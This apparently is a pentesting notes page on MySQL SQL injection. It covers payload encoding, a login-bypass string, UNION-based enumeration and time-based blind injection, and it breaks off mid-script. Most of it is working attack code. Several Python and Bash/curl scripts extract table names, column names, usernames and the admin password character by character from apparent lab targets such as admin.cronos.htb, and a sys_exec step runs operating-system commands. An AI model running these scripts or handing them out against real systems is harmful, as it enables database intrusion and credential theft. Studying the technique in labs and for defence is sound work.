  
>:bulb: **Tip:** Consider encoding in URL format (**urlencode**) the requests  
>
>Request:  
><code>sql CREATE FUNCTION sys_exec RETURNS int SONAME customlib.so</code>  
>
>Urlencoded:  
><code>sql CREATE%20FUNCTION%20sys_exec%20RETURNS%20int%20SONAME%20%27customlib.so%27</code>  
  
  
  
>:bulb: **Tip:** Consider **coding in hexadecimal** the **values** passed **in function calls**  
>
>Original Request:  
><code>sql SELECT sys_exec('ping -c 2 192.168.1.10')</code>  
>
>Encoding Command:  
><code>echo "ping -c 2 192.168.1.10" | xxd -p</code>  
>
>Hex Coded Request:  
><code>sql SELECT sys_exec(0x70696e67202d6332203139322e3136382e3439392e323034)</code>  
>
>To encode in hexadecimal: $ <mark style="color:green;">xxd -p</mark> <mark style="color:orange">[ | tr -d 'd' ]</mark>  

  
  
## Resources  
  
MySQL Manuals (available functions by versions):  
[MySQL 5.7 Reference Manual Information Functions][mysql_info_func]  
  
SQLi Cheat Sheets  
[Pentestmonkey MySQL SQL Injection Cheat Sheet][pentest_mysql_inject]  
[Hacktricks MySQL SSRF][hacktricks_mysql_inject]  
  
  
  
## Interesting Information  
  
Comparison of Case-Sensitive Strings  

<code>cast('<character>') as binary = cast('<character>') as binary</character>
  
  
  
## Exploit Vector  
  
A field where a value is entered that performs a query to a DB on the server.  
For example a login form  
  
  
  
## Magic Statement  
  
In a login form, if the query is poorly constructed, this statement entered in the user field, the password field, or both, can provide access with the first user.  
  
<code>' 0r 1=1-- -</code>
  
  
  
## 'Error Based' Type Injections  

><mark style="color:orange;font-weight:bold;">Note:</mark>  
>All the examples below are based on a **scenario** with a database named '**College**', containing a table named '**Students**', composed of **three columns** (id, username and password, in which we have entered **a record** with the values (1, d1ch0t0my, d1ch0123).  
  
  
### Quick Test  
  

```sql
' order by 100-- -
```  
  
  
### Description	 
  
If when entering in the injectable field \"<mark style="color:green;font-weight:bold">' order by 100-- -</mark>"  
It returns an error of the type "<mark style="color:blue">Unknown column '100'...</mark>"  
It can mean that we are in front of an '**Error Based**' type injection.  
Since the response is telling us that it does not know the column 100, which means that it IS processing our request.  
We can take advantage of this as a way of executing SQL statements to obtain information, etc.  
  
  
### Exploitation  
  
We can reduce the number of columns until we do NOT get this error, which will tell us the total number of columns that the database has:  
*' order by 3-- -*
Once we have found out the total number of columns, we will use the instruction '<mark style="color:grey">union select</mark>' to select all the columns and to list them:  
  
<mark style="color:green">' union select 1,2,3-- - -</mark>  
  
This should return a "label" for each column with the number we have entered, of the type:  
  

```ssh
+----+-----------+----------+
| id | username  | password |
+----+-----------+----------+
|  1 | d1ch0t0my | d1ch0123 |
|  1 | 2         | 3        |
+----+-----------+----------+
1 rows in set (0.000 sec)
```  
  
With this we can replace one of the "tags" with commands that return information from the database.  
Some examples would be:  
  
#### Get the name of the database in use  
  
<mark style="color:green">' union select 1,2,database()-- -</mark>  
  

```ssh
+----+-----------+----------+
| id | username  | password |
+----+-----------+----------+
|  1 | d1ch0t0my | d1ch0123 |
|  1 | 2         | Colegio  |
+----+-----------+----------+
1 rows in set (0.000 sec)
```  
  
#### Get the user who is running the database  
  
<mark style="color:green">' union select 1,2,user()-- -</mark>  
  
```ssh
+----+-----------+-----------------+
| id | username  | password        |
+----+-----------+-----------------+
|  1 | d1ch0t0my | d1ch0123        |
|  1 | 2         | root@localhost  |
+----+-----------+-----------------+
1 rows in set (0.000 sec)
```  
  
#### List all tables in the database  

<mark style="color:green">' union select 1,2,table_name from information_schema.tables-- -</mark>  
  
```ssh
+----+-----------+----------+
| id | username  | password |
+----+-----------+----------+
|  1 | d1ch0t0my | d1ch0123 |
|  1 | 2         | Colegio  |
+----+-----------+----------+
1 rows in set (0.000 sec)
```  
  
><mark style="color:orange">Note</mark>: you can limit the list adding at the end of the query "<mark style="color:blue">limit n</mark>"  
>**e.g**:  
><mark style="color:green">' union select 1,2,table_name from information_schema.tables limit 1,1-- -</mark>  ← would list the first table.  
><mark style="color:green">' union select 1,2,table_name from information_schema.tables limit 2,1-- -</mark> ← would list the second table, etc.  
  
  
  
## Blind SQL injection Time Based  
  
><mark style="color:orange">**Note:**</mark>  
>All the examples below are based on a **scenario** with a database named '**College**', containing a table named '**Students**', composed of **three columns** (id, username and password, in which we have entered **a record** with the values (1, d1ch0t0my, d1ch0123).  
  
  
### Quick Tests  
  
In the user field of a login or after any variable that we consider vulnerable:  
<mark style="color:green;font-weight:bold;">AnyUser</mark><mark style="color:green"> ' or if(1=1, sleep(5),1)-- -</mark>  
If SQL injection exists it will wait 5 seconds.  
<mark style="color:green;font-weight:bold;">AValidUser</mark> <mark style="color:green">' and sleep(5)-- -</mark>  
If the user is correct (exists), and we have SQL injection, it will wait 5 seconds.  
  
  
### Descripción  
  
When we cannot see the error response from the server side, we can use the 'sleep(n)' instruction to verify if the injection exists based on the response time.  
We concatenate the instruction we want to verify with a 'sleep' by means of an 'if' conditional, so that, if the instruction is true, it will wait the seconds we indicate in the sleep.  
  
  
### Determining the DBMS Version  

You can check the DBMS version by checking what 'delay' function we have available.  
  
##### MySQL  
Version < 5.0.12 available the <mark style="color: green">BENCHMARK()</mark> function.  
Version >= 5.0.12 available the <mark style="color: green">SLEEP()</mark> function.  
  
##### PostgreSQL  
Version < 8.2 available the function <mark style="color: green">generate_series()</mark>  
	<mark style="color: orange">NOTE:</mark> If applicable, a custom <mark style="color: green">SLEEP()</mark> function can be created from the OS system built-in libc library.  
Version >= 8.2 available the function <mark style="color: green">PG_SLEEP()</mark>  
  
##### Microsoft SQL Server  

Delay function: <mark style="color: green">WAITFOR DELAY '0:0:5'</mark>  
  
  
### Example  

If we want to find out the name of a database (it could be a table, etc.) we can make queries to the DB of the type "the character number 'n' of the string containing the name of the DB, is it an 'a'?" and concatenate them with a conditional of the type "if so wait '5' seconds".  

If the execution takes 5 seconds, or more (there may be some variation, always above 5 seconds), we will know that indeed the character 'n' of the name is an 'a'.  

The syntax of this type of queries in SQL, for the database name, would be:  
<mark style="color: green">select username,password from Students where id = 1 and if(substr(</mark><mark style="color: yellow">database()</mark><mark style="color: green">,</mark><mark style="color: yellow">1</mark><mark style="color: green">,1)='</mark><mark style="color: yellow">a</mark><mark style="color: green">',sleep(</mark><mark style="color: yellow">5</mark><mark style="color: green">),1);-- -;</mark>  


Where:
* <mark style="color:orange;">select usename, password from Alumnos where id = 1</mark> selects the username and password fields from the Alumnos table, from the database in use, whose id is 1.  
* <mark style="color:orange;">and</mark> is the boolean operator to add a statement after it  
* <mark style="color:orange;">'if'</mark> is the conditional operator to indicate "if the condition following it in parentheses is met do such a thing".  
* <mark style="color:orange;">substr</mark> gets the value of the character 'n' of a string str, with a syntax like substr(str,n,1), in this case the first character of the string that is obtained by executing the command "database()" which in turn what it does is to get the name of the database in use  
* <mark style="color:orange;">='a'</mark> equals to 'a' the character obtained by substr  
* <mark style="color:orange;">sleep(5)</mark> tells to wait 5 seconds before continuing execution  
  
  
### Automation  

We will create a python script to perform the server queries in an automated way.  
The script will send the requests to check the characters that make up the string that forms the name we want to find out one by one (the name length will be predefined) with all the abcedary and numbers from 0 to 9.  
If the answer takes more than the predefined number of seconds, it will mean that the queried character is correct (case insensitive) and will add it to a string 'result' which will be printed as the final result.  
  
#### Find Database Name  

The query would be: <mark style="color:green;">substr(database(),%d,1)='%c',sleep(5),1)</mark>  

Where:  

* <mark style="color:orange;">database()</mark> is the SQL statement that returns a string with the name of the DB in use.  
* <mark style="color:orange;">%d</mark> will be the position of the character that is being checked  
* <mark style="color:orange;">%c</mark> shall be the position in the array of characters to be tested of the character being tested  
* <mark style="color:orange;">5</mark> will be the number of seconds to wait before proceeding with the execution (if it waits it is a match)  

[sqli_pwner_POST.py][sqli_pwner_POST]
[sqli_pwner_GET.py][sqli_pwner_GET]
[sqli_CURL.sh][sqli_CURL]

  
#### Query Known Database Tables  

The query would be:  
<mark style="color:green;">substr((select table_name from information_schema.tables where table_schema='</mark><mark style="color:yellow">BBDD_Name</mark><mark style="color:green">' limit %d,1),%d,1)='%c',sleep(5),1</mark>  

Where:  
* <mark style="color:orange;">BBDD_Name</mark> is the name of the BBDD containing the table(s) for which we want to find out the name(s).  
* <mark style="color:orange;">%d</mark> will indicate the number of tables to find the name of (to put a limit of tables, in case there are many)  
* <mark style="color:orange;">%d</mark> will be the position of the character that is being checked  
* <mark style="color:orange;">%c</mark> will be the position in the array of characters to test of the character being tested  
* <mark style="color:orange;">5</mark> will be the number of seconds to wait before proceeding with the execution (if it waits it is a match)  

<mark style="color:green;">sqli_pwner.py</mark>  

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'
result = ''

def check(payload):
data_post = {
'username': '%s' % payload,
'password': 'test'
}
time_start = time.time()
content = requests.post(url, data=data_post)
time_end = time.time()
if time_end - time_start > 5:
return 1

p2 = log.progress("Payload")

for j in xrange (0, 3):
p1 = log.progress("Tabla [%d]" % j)
# variable to check for blanks
cont = 0
for i in xrange(1, 10):
# If it has added more than 2 times without finding a character, it is understood that they are blank characters, the search for that column is terminated.
if ( cont > 2 ):
break

for c in s:
payload = "' or if(substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (j,i,c)
p2.status("%s" % payload)
if check(payload):
result += c
p1.status("%s" % result)
# if it has found a match it resets the blank character counter to allow spaces between the words that form the name
cont = 0
break

# if all characters have been traversed it means that no match has been found, 1 is added to blank characters
cont += 1

p1.success("%s" % result)
# clears the contents of the result variable to start with the following table
result = ''
```

<mark style="color:green;">sqli_db_tables.sh</mark>  

```sh
#!/bin/bash

# DEFINITION OF COLORS TO USE IN BASH SCRIPTS
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURE Ctrl+C
trap ctrl_c INT

function ctrl_c(){
echo -e "\n[${yellow}!${def}] Detectado Ctrl+C"
echo -e "[${red}*${def}] Finalizando la ejecución..."
tput cnorm
exit 0
}

tput civis
echo

# ADAPT THESE VALUES
host='192.168.102.52'
tablelimit=100
charlimit=100

# variable storing the characters to be tested
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'

# name of the known database
bbdd="zm"

# variable to store the results
result=""
whitechar=0
whitetable=0

for (( t=0; t<=$tablelimit; t++)) # table limit
do
if [[ "whitetable" -ge "2" ]]
then
echo -e "[${yellow}¡${def}] Segunda tabla en blanco"
echo -e "[${green}*${def}] Fin de enumeración de TABLAS"
tput cnorm
exit 0
fi
echo -e "${white}Enumerando tabla ${cian}$t${def}\n"
for (( i=0; i<=$charlimit; i++))
do
if [[ "whitechar" -ge "2" ]]
then
echo -e "  \e[1A\e[K[${grey}-${def}] Segundo caracter en blanco"
echo -e "  Fin de enumeración de la tabla $t\n"
echo -e "  ${white}Tabla: ${green}$result${def}\n\n"
chrlen=${#result}
if [[ "$chrlen" -le 1 ]]
then
whitetable=$((whitetable + 1))
fi
break
fi

# nested loop that loops through each of the characters stored in the char variable
for (( k=0; k<${#char}; k++ ))
do
echo -e "  \e[1A\e[KProbando caracter ${char:$k:1} en posición $i: $result""_"

SECONDS=0
curl -X POST "http://$host/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( SELECT( if( \
substr((select table_name from information_schema.tables where table_schema='zm' limit $t,1),$i,1)='${char:$k:1}',sleep(5),1 \
) ) )OQkj)#minTime=1'" &>/dev/null

DURATION=$SECONDS        

# check if the difference between the start time and the end time is greater than 5 seconds
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -eq "1" ]]
then
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
else
echo -e "  \e[2A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
fi
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
fi
fi
done
done
if [[ "whitechar" -ge "2" ]]
then
whitechar=0
result=""
else
echo -e "  Se ha alcanzado el límite de 15 caracteres por tabla. Fin de enumeración de la tabla $t"
echo -e "\n  ${white}Tabla: $result\n\n"
whitechar=0
result=""
fi
done
echo -e "[${green}*${def}]Fin de enumeración de tablas"
tput cnorm
```

Note that in this case the statement is put in parentheses, so that it does not give errors in the execution.
A whitespace counter is added (to lighten the search).
The first character that does not match will be continued, to allow compound names, with two or more words.
The second time, consecutively, that it does not find a match, it understands that it is 2 blanks in a row and understands that the search is finished.
  
#### Finding Known Table Columns

The query would be: <mark style="color:green">substr((select </mark><mark style="color:yellow">column_name</mark><mark style="color:green"> from information_schema.</mark><mark style="color:yellow">columns</mark><mark style="color:green"> where table_name='</mark><mark style="color:yellow">Table_Name</mark><mark style="color:green">' limit %d,1),%d,1)='%c',sleep(5),1</mark>  

Where:
* <mark style="color:orange">Table_Name</mark> is the name of the table from which we want to get the columns.  
* <mark style="color:orange">%d</mark> will indicate the number of columns we want to search (to put a limit, in case there are too many)  
* <mark style="color:orange">%d</mark> will be the position of the character we are checking for  
* <mark style="color:orange">%c</mark> will be the position in the array of characters to test of the character being tested  
* <mark style="color:orange">5</mark> will be the number of seconds to wait before proceeding with the execution (if it waits, it matches).  

<mark style="color:red">WARNING !!!</mark> Table Names ARE **CASE SENSITIVE** ← test with the **first upper case** and the rest lower case.

<mark style="color:green;">sqli_pwner.py</mark>

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'
result = ''

def check(payload):
data_post = {
'username': '%s' % payload,
'password': 'test'
}
time_start = time.time()
content = requests.post(url, data=data_post)
time_end = time.time()
if time_end - time_start > 5:
return 1

p2 = log.progress("Payload")

for j in xrange (0, 3):
p1 = log.progress("Tabla [%d]" % j)
for i in xrange(1, 10):
if i >= 4:
if result == '':
break
for c in s:
payload = "' or if(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (j,i,c)

p2.status("%s" % payload)
if check(payload):
result += c
p1.status("%s" % result)
break

p1.success("%s" % result)
result = ''
```

<mark style="color:red">WARNING !!!</mark> Table Names ARE **CASE SENSITIVE** ← test with the **first upper case** and the rest lower case.

<mark style="color:green;">sqli_db_columns.sh table_name">"</mark>

```sh
#!/bin/bash

# DEFINITION OF COLORS TO USE IN BASH SCRIPTS
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURE Ctrl+C
trap ctrl_c INT


function ctrl_c(){
echo -e "\n[${yellow}!${def}] Detectado Ctrl+C"
echo -e "[${red}*${def}] Finalizando la ejecución..."
tput cnorm
exit 0
}

function usage(){
echo -e "\n${white}[${red}!${white}]${def} ERROR: no se ha proporcionado el nombre de la tabla a enumerar\n"
echo -e "${white}[${def}-${white}]${def} USO:\n\t${white}$0 ${yellow}<nombre_de_tabla>${def}"
echo -e "\t${grey}$0 Users${def}"
echo -e "\n\n${white}[${yellow}!${white}]${def} RECUERDA:\n\t Los ${white}nombres${def} de las ${white}tablas${def} son ${white}CASE SENSITIVE${def}"
echo -e "\tProbar con la primera letra en mayúscula y el resto en minúscula"
exit 0
}

if [[ "$#" -lt 1 ]]
then
usage
fi

tput civis

# ADAPT THESE VALUES
host='192.168.102.52'
tablename=$1 # pass the name of the table to list as argument 1
tablelimit=100
charlimit=100

# variable to store the characters to be tested
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'

# variable to store the results
result=""
whitechar=0
whitecolumn=0

echo -e "\n${white}[${green}*${white}] --- Enumerando COLUMNAS de la tabla ${yellow}$tablename ${white}--- [${green}*${white}]${def}\n"

for (( t=0; t <= $tablelimit; t++)) # COLUMNS limit
do
if [[ "whitecolumn" -ge "2" ]]
then
echo -e "[${yellow}¡${def}] Segunda COLUMNA en blanco"
echo -e "[${green}*${def}] Fin de enumeración de COLUMNAS"
tput cnorm
exit 0
fi
echo -e "${white}Enumerando COLUMNA ${cian}$t${def}\n"
for (( i=1; i <= $charlimit; i++))
do
if [[ "whitechar" -ge "2" ]]
then
echo -e "  \e[1A\e[K[${grey}-${def}] Segundo caracter en blanco"
echo -e "  Fin de la enumeración de la COLUMNA $t\n"
echo -e "  ${white}Columna: ${green}$result${def}\n\n"
chrlen=${#result}
if [[ "$chrlen" -le 1 ]]
then
whitecolumn=$((whitecolumn + 1))
fi
break
fi

# nested loop that loops through each of the characters stored in the char variable
for (( k=0; k<${#char}; k++ ))
do
echo -e "  \e[1A\e[KProbando caracter ${char:$k:1} en posición $i: $result""_"

SECONDS=0
curl -X POST "http://$host/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( SELECT( if( \
substr((select column_name from information_schema.columns where table_name='$tablename' limit $t,1),$i,1)='${char:$k:1}',sleep(5),1 \
) ) )OQkj)#minTime=1'" &>/dev/null

DURATION=$SECONDS

# check whether the difference between the start and end time is greater than 5 seconds
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -eq "1" ]]
then
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
else
echo -e "  \e[2A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
fi
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
fi
fi
done
done
if [[ "whitechar" -ge "2" ]]
then
whitechar=0
result=""
else
echo -e "  Se ha alcanzado el límite de $charlimit caracteres por columna."
echo -e "\n  ${yellow}Columna: $result${def}\n\n"
whitechar=0
result=""
fi
done
echo -e "[${green}*${def}]Fin de enumeración de COLUMNAS"
tput cnorm
```

Note that in this case the statement is put in parentheses, so that it does not give errors in the execution.
A whitespace counter is added (to lighten the search).
The first character that does not match will be continued, to allow compound names, with two or more words.
The second time, consecutively, that it does not find a match, it understands that it is 2 blanks in a row and understands that the search is finished.

#### Find Known Field Value in Known Table Based on Column ID

The query would be: <mark style="color:green">substr((select </mark><mark style="color:yellow">columnUserName</mark><mark style="color:green"> from</mark><mark style="color:yellow"> tableUsers</mark><mark style="color:green"> where id='</mark><mark style="color:yellow">%d</mark><mark style="color:green">'),</mark><mark style="color:yellow">%d</mark><mark style="color:green">,1)='</mark><mark style="color:yellow">%c</mark><mark style="color:green">',sleep(5),1</mark>

Where:

columnUserName → is the name of the column containing the user names.
tableUsers → is the name of the table that contains the column with the usernames
* <mark style="color:orange">%d</mark> will indicate the number of users we want to identify (to put a limit, in case there are many)  
* <mark style="color:orange">%d</mark> will be the position of the character that is being checked  
* <mark style="color:orange">%c</mark> will be the position in the array of characters to be tested of the character being tested  
* <mark style="color:orange">5</mark> will be the number of seconds to wait before proceeding with the execution (if it waits it is a match)  

<mark style="color:green"> sqli_pwner.py</mark>  

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'abcdefghijklmnopqrstuvwxyz0123456789.:*@#$%^&-_=()!¡\/{}[]'
result = ''

def check(payload):
data_post = {
'username': '%s' % payload,
'password': 'test'
}
time_start = time.time()
content = requests.post(url, data=data_post)
time_end = time.time()
if time_end - time_start > 5:
return 1

p2 = log.progress("Payload")

for j in xrange (0, 4):
p1 = log.progress("Usuario[%d]" % j)

# variable to check for blanks
cont = 0

for i in xrange(1, 10):
# If it has added more than 2 times without finding a character, it is understood that they are blank characters, the search for that column is terminated.
if ( cont > 2 ):
break

for c in s:
payload = "' or if(substr((select username from users where id='%d'),%d,1)='%c',sleep(5),1)-- -" % (j,i,c)
p2.status("%s" % payload)

if check(payload):
result += c
p1.status("%s" % result)
# if it has found a match it resets the blank character counter to allow spaces between the words that form the name
cont = 0
break

# if it has reached all the characters it means that it has not found any match, 1 is added to the blank characters.
cont += 1

p1.success("%s" % result)
result = ''
```


<mark style="color:green">sqli_db_field_id.sh campo> tabla></mark><mark style="color:orange"> [longitud_máxima_del_campo]</mark>

```sh
#!/bin/bash

# DEFINITION OF COLORS TO USE IN BASH SCRIPTS
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURE Ctrl+C
trap ctrl_c INT


function ctrl_c(){
echo -e "\n[${yellow}!${def}] Detectado Ctrl+C"
echo -e "[${red}*${def}] Finalizando la ejecución..."
tput cnorm
exit 0
}

function usage(){
echo -e "\n${white}[${red}!${white}]${def} Se ha producido uno de los siguientes ERRORES:"
echo -e "\t- No se ha proporcionado el nombre de la tabla a enumerar (como argumento 1)"
echo -e "\t- No se ha proporcionado el nombre del campo a enumerar (como argumento 2)"
echo -e "\t- Se han proporcionado más argumentos de los esperados (máximo 3)\n"
echo -e "${white}[${def}-${white}]${def} USO:\n\t${white}$0 ${yellow} <nombre_de_campo> <nombre_de_tabla> ${grey}[longitud_del_campo]${def}"
echo -e "\t${grey}$0 username Users 20${def}"
echo -e "\n\n${white}[${yellow}!${white}]${def} RECUERDA:\n\tLos ${white}nombres${def} de las ${white}tablas${def} son ${white}CASE SENSITIVE${def}"
echo -e "\tProbar con la primera letra en mayúscula y el resto en minúscula"
exit 0
}

if [[ "$#" -lt "2" ]]
then
usage
fi

if [[ "$#" -gt "3" ]]
then
usage
fi

tput civis

# ADAPT THESE VALUES
host='192.168.102.52'
fieldname=$1 # pass the name of the field to enumerate as argument 1
tablename=$2 # pass the name of the table to enumerate as argument 2
resultlimit=100
charlimit=100

# correct the character limit depending on whether one is given as argument 3
if [[ "$#" -eq "3" ]]
then
charlimit=$3
fi

# variable to store the characters to be tested
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'

# variable to store the results
result=""
whitechar=0
whiteresult=0

echo -e "\n${white}[${green}*${white}] --- Enumerando campo ${yellow}$fieldname${def} de la tabla ${yellow}$tablename ${white}en base a ID --- [${green}*${white}]${def}\n"
for (( t=0; t <= $resultlimit; t++)) # limit of RESULTS to obtain
do
if [[ "whiteresult" -ge "2" ]]
then
echo -e "[${yellow}¡${def}] Segundo ID en blanco"
echo -e "[${green}*${def}] Fin de enumeración del campo $fieldname en la tabla $tablename"
tput cnorm
exit 0
fi
echo -e "${white}Enumerando ID ${cian}$t${white} del campo $fieldname${def}\n"
for (( i=1; i <= $charlimit; i++))
do
if [[ "whitechar" -ge "2" ]]
then
echo -e "  \e[1A\e[K[${grey}-${def}] Segundo caracter en blanco"
echo -e "  Fin de la enumeración del ID $t del campo $fieldname\n"
echo -e "  ${white}Valor del campo $fieldname para ID $t: ${green}$result${def}\n\n"
chrlen=${#result}
if [[ "$chrlen" -le 1 ]]
then
whiteresult=$((whiteresult + 1))
fi
break
fi

# nested loop that goes through each of the characters stored in the variable char
for (( k=0; k<${#char}; k++ ))
do
echo -e "  \e[1A\e[KProbando caracter ${char:$k:1} en posición $i: $result""_"

SECONDS=0
curl -X POST "http://$host/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( SELECT( if( \
substr((select $fieldname from $tablename where id=$t),$i,1)='${char:$k:1}',sleep(5),1 \
) ) )OQkj)#minTime=1'" &>/dev/null

DURATION=$SECONDS

# check if the difference between the start and end time is greater than 5 seconds
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -ge 1 ]]
then
if [[ "$whitechar" -eq 1 ]] # write correction if the first character was blank but not the others
then
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
else
echo -e "  \e[2A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
fi
else
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
break
fi
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
fi
fi
done
done
if [[ "whitechar" -ge "2" ]]
then
whitechar=0
result=""
else
echo -e "  Se ha alcanzado el límite de $charlimit caracteres por campo."
echo -e "\n  ${yellow}Valor del campo $fieldname para ID $t: ${green}$result${def}\n\n"
whitechar=0
result=""
fi
done
echo -e "[${green}*${def}] Fin de enumeración del campo $fieldname en la tabla $tablename"
tput cnorm
```

Note that in this case the statement is put in parentheses, so that it does not give errors in the execution.
A whitespace counter is added (to lighten the search).
The first character that does not match will be continued, to allow compound names, with two or more words.
The second time, consecutively, that it does not find a match, it understands that it is 2 blanks in a row and understands that the search is finished.

#### Find Known Field Value of Known User in Known Column of Known Table

The query would be: <mark style="color:green">substr((select </mark><mark style="color:yellow">password</mark><mark style="color:green"> from</mark><mark style="color:yellow"> users</mark><mark style="color:green"> where username='</mark><mark style="color:yellow"> admin</mark><mark style="color:green">'),</mark><mark style="color:yellow">%d</mark><mark style="color:green">,1)='%c',sleep(5),1)-- - -</mark>

Where:
* <mark style="color:orange">columnPassword</mark> is the name of the column containing the passwords.  
* <mark style="color:orange">tableUsers</mark> is the name of the table containing the column with the passwords  
* <mark style="color:orange">userKnown</mark> is the name of the known user, from which the password is to be obtained  
* <mark style="color:orange">%d</mark> will be the position of the character being checked  
* <mark style="color:orange">%c</mark> will be the position in the array of characters to be tested of the character being tested  
* <mark style="color:orange">5</mark> will be the number of seconds to wait before proceeding with the execution (if it waits it is a match)  

<mark style="color:green">sqli_pwner.py</mark>  

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

# variable to store the timeout of queries
sleep = 0

# set the query validation timeout to 5 if no argument is passed or to the value passed as an argument
if len(sys.argv) == 1:
sleep = 5
else:
sleep = int(sys.argv[1])

def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'abcdefghijklmnopqrstuvwxyz0123456789.:*@#$%^&-_=()!¡\/{}[]'
result = ''

def check(payload):
data_post = {
'username': '%s' % payload,
'password': 'test'
}
time_start = time.time()
content = requests.post(url, data=data_post)
time_end = time.time()
if time_end - time_start > sleep:
return 1

p1 = log.progress("Password")
p2 = log.progress("Payload")

# variable to control whitespace
cont = 0

for i in xrange(1, 40):
# If you have added more than 2 times without finding a character, it is understood that they are blank characters, the search for that column is terminated.
if ( cont > 2 ):
print("[!] tres caracters en blanco seguidos. Pasamos a la siguiente iteración")
break

for c in s:
payload = "' or if(substr((select password from users where username='admin'),%d,1)='%c',sleep(%d),1)-- -" % (i,c,sleep)
p2.status("%s" % payload)

if check(payload):
result += c
p1.status("%s" % result)
# if it has found a match it resets the blank character counter to allow spaces between the words that form the name
cont = 0
break

# if it has reached all the characters it means that it has not found any match, 1 is added to the blank characters.
cont = cont + 1

p1.success("%s" % result)
result = ''
```

<mark style="color:green">sqli_db_field_value.sh</mark><mark style="color:orange"> tabla> campo_conocido> valor_campo_conocido> campo_del_que_obtener_el_valor> [longitud_máxima_del_campo] </mark>

```sh
#!/bin/bash

# DEFINITION OF COLORS TO USE IN BASH SCRIPTS
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURE Ctrl+C
trap ctrl_c INT


function ctrl_c(){
echo -e "\n[${yellow}!${def}] Detectado Ctrl+C"
echo -e "[${red}*${def}] Finalizando la ejecución..."
tput cnorm
exit 0
}

function usage(){
echo -e "\n${white}[${red}!${white}]${def} Se ha producido uno de los siguientes ERRORES:"
echo -e "\t- No se ha proporcionado el nombre de la tabla (como argumento 1)"
echo -e "\t- No se ha proporcionado el nombre del campo a usar como referencia (como argumento 2)"
echo -e "\t- No se ha proporcionado el valor que debe contener el campo de referencia (como argumento 3)"
echo -e "\t- No se ha proporcionado el nombre del campo del que se desea obtener el valor (como argumento 4)"
echo -e "\t- Se han proporcionado más argumentos de los esperados (máximo 5)\n"
echo -e "${white}[${def}-${white}]${def} USO:\n\t${white}$0 ${yellow} <nombre_de_tabla> <campo_de_referencia> <valor_del_campo_de_referencia> <campo_del_que_obtener_el_valor> ${grey}[longitud_del_campo]${def}"
echo -e "\t${grey}$0 Users username admin password 40${def}"
echo -e "\n\n${white}[${yellow}!${white}]${def} RECUERDA:\n\tLos ${white}nombres${def} de las ${white}tablas${def} son ${white}CASE SENSITIVE${def}"
echo -e "\tProbar con la primera letra en mayúscula y el resto en minúscula"
exit 0
}

if [[ "$#" -lt "4" ]]
then
usage
fi

if [[ "$#" -gt "5" ]]
then
usage
fi

tput civis

tablename=$1    # pass the name of the table to enumerate as argument 1
fieldname=$2    # pass the name of the field to be used as reference as argument 2
fielvalue=$3    # pass the value to be contained in the reference field as argument 3
